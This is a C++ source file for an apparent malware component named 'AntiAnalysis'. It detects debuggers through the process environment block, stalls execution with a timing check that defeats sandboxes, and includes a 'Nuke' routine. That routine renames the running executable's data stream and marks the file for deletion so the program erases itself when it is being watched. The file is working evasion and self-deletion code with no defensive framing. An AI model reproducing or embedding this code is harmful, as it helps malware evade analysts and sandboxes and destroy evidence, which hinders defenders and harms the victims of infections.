#pragma once
#include "utils/headers/antianalysis.h"
#include "utils/headers/Tools.h"
#include "utils/headers/CRTdefs.h"

#define NEW_STREAM L":a"

bool AntiAnalysis::CheckPebForDebug(API::APIResolver& resolver)
{
    PROCESS_BASIC_INFORMATION pbi;

    API::API_ACCESS api = resolver.GetAPIAccess();
    HANDLE hProcess     = NtCurrentProcess();

    if (api.func.pNtQueryInformationProcess)
    {
        ULONG returnLength;
        NTSTATUS status = api.func.pNtQueryInformationProcess(
            hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            &returnLength
        );

        if (NT_SUCCESS(status))
        {
            if (pbi.PebBaseAddress && pbi.PebBaseAddress->BeingDebugged)
                return true;
        }
        else
            return false;
        
    }
    return false;
}

bool AntiAnalysis::IsBeingWatched(API::APIResolver& resolver)
{
    //TODO: add anti vm functionality

    if (CheckPebForDebug(resolver)) {
        this->Nuke(resolver);
        ExitProcess(0);
    }
    return false;
}

bool AntiAnalysis::DelayExecution(float fMins, API::APIResolver& resolver) {

    // Mins to ms
    DWORD               dwMS          = fMins * 60000;
    LARGE_INTEGER       DelayInterval = { 0 };
    long long           delay         = NULL;
    NTSTATUS            status        = NULL;


    API::API_ACCESS api = resolver.GetAPIAccess();

    delay = dwMS * 10000;
    DelayInterval.QuadPart = -delay;

    long long T0 = GetTickCount64();

    if ((status = api.func.pNtDelayExecution(FALSE, &DelayInterval)) != 0x00 && status != STATUS_TIMEOUT) 
        return false;
    

    long long T1 = GetTickCount64();

    if ((DWORD)(T1 - T0) < dwMS)
        return false;

    return true;
}


int AntiAnalysis::Nuke(API::APIResolver& resolver)
{
    WCHAR                       szPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO       dispinfo             = { 0 };
    HANDLE                      hFile                = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO           pRename              = NULL;
    NTSTATUS                    status;
    OBJECT_ATTRIBUTES           object_attributes = { sizeof(OBJECT_ATTRIBUTES), nullptr, nullptr, 0, nullptr, nullptr };


    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;

    size_t sStreamLength = wcslen(NewStream) * sizeof(wchar_t);
    size_t sRename      = sizeof(FILE_RENAME_INFO) + sStreamLength;

    auto api = resolver.GetAPIAccess();

    pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename); // Allocate memory for structure
     
    if (!pRename) 
        return FALSE;
    
    ZeroMemory(szPath, sizeof(szPath));
    ZeroMemory(&dispinfo, sizeof(FILE_DISPOSITION_INFO));

    dispinfo.DeleteFile = TRUE; // Mark file for deletion

    // Setting the new data stream name buffer and size 
    pRename->FileNameLength = sStreamLength;
    RtlCopyMemory(pRename->FileName, NewStream, sStreamLength);

    // Get current file name
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) 
        return FALSE;
    
    
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL); // Open handle to current file

    //UNICODE_STRING unicodePath;

    //if (api.func.RtlInitUnicodeString)
    //    api.func.RtlInitUnicodeString(&unicodePath, szPath);
    //

    ////RtlInitUnicodeString(&unicodePath, szPath);
    //InitializeObjectAttributes(&object_attributes, &unicodePath, OBJ_CASE_INSENSITIVE, NULL, NULL);


    //IO_STATUS_BLOCK io_status;
    //status = api.func.pNtCreateFile(
    //    &hFile,
    //    FILE_GENERIC_READ | FILE_GENERIC_WRITE,
    //    &object_attributes,
    //    &io_status,
    //    NULL,
    //    FILE_ATTRIBUTE_NORMAL,
    //    FILE_SHARE_READ | FILE_SHARE_WRITE,
    //    FILE_OPEN,
    //    FILE_NON_DIRECTORY_FILE,
    //    NULL,
    //    0 
    //);
    

    if (hFile == INVALID_HANDLE_VALUE) 
        return FALSE;
    
    if (api.func.pSetFileInformationByHandle)
    {
        NTSTATUS status = api.func.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename);
        if (!NT_SUCCESS(status))
            return FALSE;
    }

    CloseHandle(hFile);

    // Open new handle
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) 
        return FALSE;
    
    
    if (api.func.pSetFileInformationByHandle)
    {
        NTSTATUS status = api.func.pSetFileInformationByHandle(hFile, FileDispositionInfo, &dispinfo, sizeof(dispinfo));
        if (!NT_SUCCESS(status))
            return FALSE;
    }

    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pRename);

    return TRUE;
}


